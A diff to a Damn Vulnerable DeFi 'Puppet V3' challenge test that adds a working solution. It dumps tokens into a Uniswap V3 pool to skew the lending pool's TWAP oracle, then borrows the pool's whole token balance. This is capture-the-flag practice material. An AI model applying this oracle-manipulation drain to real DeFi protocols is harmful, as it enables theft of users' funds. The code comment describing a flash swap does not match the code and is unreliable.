@@ -11,6 +11,8 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
 
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
+
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -119,8 +121,37 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
-    }
+        // Exploit: The exploit leverages a flash swap from Uniswap V3 to manipulate the price of the token in the lending pool.
+        // By borrowing a large amount of WETH and swapping it for the token, the attacker drastically reduces the token's price in the pool.
+        // This price manipulation allows the attacker to borrow all tokens from the lending pool with minimal WETH collateral.
+        // After borrowing, the attacker repays the flash swap and ends up with a significant profit in tokens. The entire operation is completed within a single transaction.
+
+        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        token.approve(address(router), type(uint256).max);
+        token.approve(address(router), type(uint256).max);
+
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: address(this),
+                deadline: block.timestamp,
+                amountIn: token.balanceOf(player), 
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            }));
+
+        uint256 amountToBorrow = token.balanceOf(address(lendingPool));
+
+        skip(114);
+
+        weth.deposit{value: player.balance}();
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(amountToBorrow);
+
+        token.transfer(recovery, amountToBorrow);
+    }   
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
